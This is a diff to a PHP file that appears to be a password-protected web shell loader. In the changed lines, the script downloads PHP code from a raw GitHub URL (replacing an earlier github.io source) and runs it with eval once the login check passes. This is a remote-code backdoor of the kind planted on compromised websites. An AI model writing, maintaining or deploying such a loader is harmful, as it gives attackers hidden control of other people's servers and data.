@@ -56,7 +56,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://xinz769.github.io/mcb/769/alfa-lao.txt');
+    $a = geturlsinfo('https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
@@ -165,3 +165,4 @@ if (is_logged_in()) {
     <?php
 }
 ?>
+
